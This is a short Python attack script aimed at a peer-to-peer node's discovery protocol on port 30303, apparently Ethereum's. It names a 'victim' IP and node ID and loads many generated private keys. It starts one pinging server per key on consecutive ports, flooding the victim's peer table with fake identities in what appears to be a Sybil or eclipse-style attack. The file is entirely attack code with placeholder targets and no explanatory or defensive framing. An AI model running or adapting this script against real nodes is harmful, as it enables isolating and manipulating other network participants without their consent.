#!/usr/bin/env python
import time
from discovery import EndPoint, PingPacket, PingServer, EchoServer
import socket
from secp256k1 import PrivateKey
import os

def generateKeypair(fileName):
	k = PrivateKey(None)
	f = open(fileName, "w")
	f.write(k.serialize())
	f.close()



if __name__ == "__main__":

	victimIP = u'0.0.0.0'

	ourID = "<nodeID>"
	theirID = "<victimID>"

	# Just take the IP that routes to the target. ignore error handling

	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((victimIP, 30303))
	localIP = s.getsockname()[0]
	print("Using local IP: " + localIP)
	s.close()

	# Use these addresses to define the endpoints used by the PingServer
	their_endpoint = EndPoint(victimIP, 30303, 30303)
	
	endpoints = {}
	servers = {}
	for f in os.listdir("keys/"):
		kid = f.split("_")[1]
		port = 30303 + len(endpoints)
		endpoints[kid] = EndPoint(localIP, port, port)
		servers[kid] = PingServer(endpoints[kid], their_endpoint, 1, "keys/privKey_"+kid, kid)
		servers[kid].startListening()
		servers[kid].startPingLoop()
	